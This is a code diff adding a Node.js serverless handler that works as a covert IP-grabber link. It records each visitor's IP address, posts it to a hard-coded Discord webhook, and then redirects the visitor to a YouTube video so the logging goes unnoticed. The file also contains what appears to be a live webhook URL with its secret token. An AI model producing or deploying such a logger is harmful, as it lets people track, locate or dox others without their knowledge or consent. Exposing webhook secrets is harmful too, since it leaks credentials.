@@ -1,0 +1,27 @@
+import fetch from 'node-fetch';
+
+export default async function handler(req, res) {
+  const visitorIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+
+  // Replace this with your actual Discord webhook URL
+  const webhookUrl = 'https://discord.com/api/webhooks/1505570928007057630/fHIzbKRE8m8Ziso_WzM5Cifde8WM8cE-sfE-Ceq8C1e4qvA-v0w5GlY35mW0ySgQe6H9';
+
+  // Send IP to Discord
+  try {
+    await fetch(webhookUrl, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        content: `New IP logged: ${visitorIp}`,
+      }),
+    });
+  } catch (error) {
+    console.error('Error sending webhook:', error);
+  }
+
+  // Redirect to a thank you page or any URL you want
+  res.writeHead(302, { Location: 'https://www.youtube.com/watch?v=6DooAFlcXA8' });
+  res.end();
+}
